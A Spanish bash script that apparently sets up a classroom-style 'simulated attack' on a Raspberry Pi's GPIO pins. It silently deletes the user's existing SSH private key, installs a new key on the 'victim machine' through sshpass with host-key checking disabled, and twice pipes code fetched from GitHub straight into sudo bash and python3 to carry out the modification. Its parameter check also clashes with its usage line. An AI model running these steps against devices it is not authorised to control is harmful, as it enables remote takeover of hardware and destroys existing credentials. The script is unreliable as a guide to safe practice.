#!/bin/bash

# Este script es la configuración previa antes de realizar el ataque simulado de modificar el GPIO de la Raspberry Pi

# Ejecución del Script

# curl -sL https://raw.githubusercontent.com/L1LBRO/Modificar-GPIO-Raspberry-Pi/refs/heads/main/Configuracion_previa_ssh.sh | sudo bash -s

# Definir constantes de color
cColorAzul='\033[0;34m'
cColorAzulClaro='\033[1;34m'
cColorVerde='\033[1;32m'
cColorRojo='\033[1;31m'
cFinColor='\033[0m'

echo ""
echo -e "${cColorAzulClaro} Iniciando el script de modificación del GPIO de la Raspberry (x)...${cFinColor}"
echo ""

# Verificación de la cantidad de parámetros
if [ $# -ne 5 ]; then
    echo "" 
    echo "Uso: $0 -s <IP> <Passphrase> <Usuario> <Pin Gpio> <RaspberryPass>"
    echo ""
    exit 1
fi

# Parámetros
vIpRaspberry=$1
vPassp=$2
vUser=$3
vGpio=$4
vRaspPass=$5 

# Generación de claves ssh
echo ""
echo "Generando las claves ssh para conectarse a la Raspberry...."
echo ""

# Archivo de las claves
vKey_Name="${HOME}/.ssh/id_rsa"

# Eliminar si la clave ya existe
if [ -f "$vKey_Name" ]; then
    rm -f "$vKey_Name"
fi

# Generación de la clave ssh
ssh-keygen -t rsa -b 4096 -f "$vKey_Name" -C "$vUser@$vIpRaspberry" -N "$vPassp"

if [ $? -eq 0 ]; then
    echo ""
    echo "Clave SSH generada exitosamente en $vKey_Name."
    echo ""
else
    echo ""
    echo "Hubo un error al generar la clave SSH."
    echo ""
    exit 1
fi

echo ""
echo "Enviando las claves SSH a la máquina víctima...."
echo ""

# Instalación de sshpass si no está instalado
sudo apt install sshpass -y

# Asegurarse de que los permisos de la clave pública son correctos
sudo chmod 644 "${HOME}/.ssh/id_rsa.pub"

# Usar sshpass para copiar la clave SSH con la contraseña que se pasa como argumento
echo "Enviando la clave SSH con ssh-copy-id..."
sshpass -p "$vRaspPass" ssh-copy-id -o StrictHostKeyChecking=no -i "${HOME}/.ssh/id_rsa.pub" "$vUser@$vIpRaspberry"

if [ $? -eq 0 ]; then
    echo ""
    echo "Claves enviadas correctamente."
    echo ""
else
    echo ""
    echo "Hubo un error al enviar la clave SSH."
    echo ""
    exit 1
fi

echo ""
echo "Instalando los últimos paquetes necesarios..."
echo ""

# Paquete necesario para la conexión ssh mediante python
cd ~
git clone https://github.com/WiringPi/WiringPi.git
cd WiringPi
./build

if [ $? -eq 0 ]; then
    echo ""
    echo "Paquete WiringPi instalado correctamente."
    echo ""
else
    echo ""
    echo "Hubo un error al instalar el paquete WiringPi."
    echo ""
    exit 1
fi

echo ""
echo "Versión de GPIO"
echo ""
gpio -v

echo ""
echo "Instalando Paramiko...."
echo ""

# Instalar Paramiko
sudo apt install python3-paramiko -y

if [ $? -eq 0 ]; then
    echo ""
    echo "Paquete Paramiko instalado correctamente."
    echo ""
else
    echo ""
    echo "Hubo un error al instalar el paquete Paramiko."
    echo ""
    exit 1
fi

# Llamada al script Python para modificar el GPIO
curl -sL https://raw.githubusercontent.com/L1LBRO/Modificar-GPIO-Raspberry-Pi/refs/heads/main/Gpio_Mod.py | python3 - "$vIpRaspberry" "$vKey_Name" "$vPassp" "$vUser" "$vGpio"
